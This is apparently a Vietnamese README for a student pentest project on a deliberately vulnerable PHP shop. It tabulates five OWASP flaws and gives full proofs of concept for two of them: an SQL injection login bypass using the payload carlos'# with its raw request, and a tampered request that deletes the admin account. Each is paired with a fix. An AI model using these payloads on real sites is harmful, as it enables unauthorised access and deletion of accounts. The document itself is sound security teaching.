# Pentest Website - OWASP Top 10  

## 1. Giới thiệu  

### Mô tả  
Đây là project về Pentest cơ bản, tập trung vào việc xây dựng một website có chứa lỗ hổng bảo mật và tiến hành khai thác, sau đó đưa ra giải pháp khắc phục.  

### Mục tiêu  
- Xây dựng website có chứa 5 lỗ hổng thuộc **OWASP Top 10 (2021)**.  
- Khai thác và kiểm thử các lỗ hổng.  
- Đề xuất giải pháp khắc phục.  
- Triển khai website trên một máy chủ thực tế (Linux, Ubuntu, Windows).  

### Cách tiếp cận  
Phương pháp kiểm thử bảo mật được sử dụng trong project này là **Whitebox Pentesting**, nghĩa là:  
- Có quyền truy cập mã nguồn và hệ thống.  
- Kiểm thử từ góc nhìn của developer.  
- Chủ động tạo và khai thác lỗ hổng trong mã nguồn.  

---

## 2. Các chức năng chính  
Website được xây dựng theo mô hình **MVC (Model-View-Controller)** và có các chức năng chính như:  
- ✅ Đăng nhập  
- ✅ Định danh, xác thực người dùng  
- ✅ Phân quyền người dùng  
- ✅ Quản lý bài viết, bình luận, hệ thống giỏ hàng và tiền tệ  
- ✅ Hỗ trợ upload file  
- ✅ Triển khai trên máy chủ  

# Giao diện Website

### 🔹 Giao diện chính

| Login | Register | Shop |
|---|---|---|
| ![Login](screenshots/login.png) | ![Register](screenshots/register.png) | ![Shop](screenshots/shop.png) |

| Cart | Checkout | Profile |
|---|---|---|
| ![Cart](screenshots/cart.png) | ![Checkout](screenshots/checkout.png) | ![Profile](screenshots/profile.png) |

---

<details>
  <summary>📸 Xem thêm ảnh giao diện phụ</summary>

  | Comment |  Blog |
  |---|---|
  | ![Comment](screenshots/comment.png) | ![Blog](screenshots/blog.png) |

</details>

---

## 3. Thống kê lỗ hổng OWASP Top 10 (2021)

| STT | Lỗ hổng | Mô tả | Vị trí | Mức độ |
|---|---|---|---|---|
| **1** | **A03:2021 - Injection (SQLi)** | SQL Injection trong truy vấn đăng nhập. | `/login.php` | 🔴 Cao |
| **2** | **A01:2021 - Broken Access Control** | Xóa user không xác thực quyền admin. | `/profile/updateEmail` | 🔴 Cao |
| **3** | **A08:2021 - Software and Data Integrity Failures (RCE)** | Upload file `.php` gây RCE. | `/profile/uploadAvatar` | 🔴 Cao |
| **4** | **A03:2021 - Injection (Stored XSS)** | Stored XSS trong bình luận blog do không lọc input. | `/blog_detail.php` | 🟠 Trung bình |
| **5** | **A05:2021 - Security Misconfiguration** | Truy cập file backup `git_old`, lộ thông tin. | `/backup/git_old` | 🟠 Trung bình |


---

## 4. Khai thác lỗ hổng  
<details>
  <summary>🛑<strong>A03:2021 - Injection (SQLi) - Bypass Đăng Nhập</strong></summary>

### 🔥 Tầm Quan Trọng Của Phát Hiện Chính
- **Mức độ**: 🔴 Cao  
- **Ảnh hưởng**: Cho phép bypass xác thực password, truy cập tài khoản nếu biết username hợp lệ.  
- **Hệ lụy**:  
  - Tấn công viên có thể đăng nhập vào tài khoản bất kỳ mà không cần mật khẩu đúng.  
  - Có thể leo thang đặc quyền nếu truy cập vào tài khoản admin.  
  - Tiềm năng khai thác sâu hơn nếu kết hợp với các kỹ thuật SQLi khác (ví dụ: UNION).  

---

### 📌 Phát Hiện Chung
- Truy vấn SQL tại **`/login.php`** không lọc đầu vào của biến `$username`.  
- Cho phép thực hiện **SQL Injection** bằng cách chèn ký tự `#` để comment bỏ điều kiện password.  
- Payload `carlos'#` (với `carlos` là username thật) bỏ qua kiểm tra password, cho phép login mà không cần mật khẩu đúng.  
- Payload `' OR 1=1 --` ` -- ` không hoạt động do xử lý lỗi trong `Database.php`.  

---

### 🛠 PoC - Bằng Chứng Khai Thác
#### 📌 1. Payload Tấn Công:
--------------------------------
```
Username: carlos'#
Password: (bất kỳ)
```
#### 🖥 2. Request Gửi Đến Server:
--------------------------------
```
POST /web_pen_v1/login/process HTTP/1.1
Host: target-site.com
Content-Type: application/x-www-form-urlencoded

username=carlos'#&password=randompassword
```
#### 🛠 3. Truy Vấn SQL Bị Thao Túng:
--------------------------------
```
SELECT * FROM users WHERE username = 'carlos'#' AND password = 'randompassword';
```

#### ✅ 4. Response Thành Công:
--------------------------------
HTTP/1.1 302 Found
Location: /home.php

#### 🚨 5. Ảnh Chụp Màn Hình:
--------------------------------
| PoC SQL Injection | Burp Suite PoC |
|---|---|
| ![SQL PoC](screenshots/sqlt1.png) | ![Burp Suite PoC](screenshots/sqlit2.png) |

###  🔧 Biện Pháp Khắc Phục Được Đề Xuất
Sử dụng Prepared Statement (PDO / MySQLi) để bind tham số:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();
```
- Không sử dụng truy vấn SQL với chuỗi nối trực tiếp từ input người dùng.
- Bật chế độ báo lỗi và log lỗi thay vì hiển thị lỗi SQL ra ngoài.
- Bổ sung hash password bằng password_hash() trong Register.php và verify bằng password_verify() trong Login.php.
</details> 

<details>
  <summary>🛑<strong> A01:2021 - Broken Access Control - Xóa Bất Kỳ User</strong></summary>

### 🔥 Tầm Quan Trọng Của Phát Hiện Chính
- **Mức độ**: 🔴 Cao  
- **Ảnh hưởng**: Cho phép người dùng thường xóa bất kỳ tài khoản nào, kể cả admin.  
- **Hệ lụy**:  
  - Tấn công viên có thể xóa tài khoản quan trọng, gây mất dữ liệu.  
  - Nếu admin bị xóa, hệ thống có thể mất quyền quản lý.  
  - Không có kiểm tra quyền, bất kỳ user nào cũng có thể khai thác.  

---

### 📌 Phát Hiện Chung
- Trang **Profile** có chức năng cập nhật email (`updateEmail()`), nhưng **hàm xóa user (`deleteUser()`) không có kiểm tra quyền**.  
- Kẻ tấn công có thể **thay đổi request** từ `updateEmail` thành `deleteUser` để xóa bất kỳ tài khoản nào, kể cả admin.  
---

### 🛠 PoC - Bằng Chứng Khai Thác  

#### 📌 1. Đăng nhập vào hệ thống với một tài khoản bình thường.  
#### 📌 2. Chặn request bằng Intercept -> Gửi đến Repeater.  
#### 📌 3. Sửa request `/profile/updateEmail` -> /profile/deleteUser + used_id'random'.  

**Yêu cầu gốc (Request hợp lệ - cập nhật email):**
```
POST /profile/updateEmail HTTP/1.1
Host: target-site.com
Content-Type: application/x-www-form-urlencoded

email=hacker@evil.com
```
#### 📌 4. Chỉnh sửa request:
-Đổi URL /profile/updateEmail thành /profile/deleteUser.
-Thêm tham số user_id với giá trị ID của nạn nhân (ví dụ: 1 là admin).
Yêu cầu đã chỉnh sửa (Request tấn công - xóa user ID 1):
```
POST /profile/deleteUser HTTP/1.1
Host: target-site.com
Content-Type: application/x-www-form-urlencoded

user_id=1
```
#### ✅ 5. Gửi request.
- Nếu lỗ hổng tồn tại, tài khoản có id=1 sẽ bị xóa mà không cần quyền admin.
- Nếu admin bị xóa, hệ thống có thể bị vô hiệu hóa hoặc rơi vào trạng thái không thể quản lý.
- 📸 Ảnh Chụp Màn Hình (PoC Visuals)
	
| Capture | Playload  | Result |
|---|---|---|
| ![Login](screenshots/login.png) | ![Register](screenshots/register.png) | ![Shop](screenshots/shop.png) |
#### 🔧 Biện Pháp Khắc Phục Đề Xuất
Kiểm tra quyền admin trước khi xóa user:
```
if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
    $_SESSION['error'] = "Unauthorized access!";
    header("Location: " . URLROOT . "/profile");
    exit();
}
```
- Sử dụng CSRF token để tránh giả mạo request.
- Ghi log hoạt động quan trọng để theo dõi thao tác quản trị.
</details> 
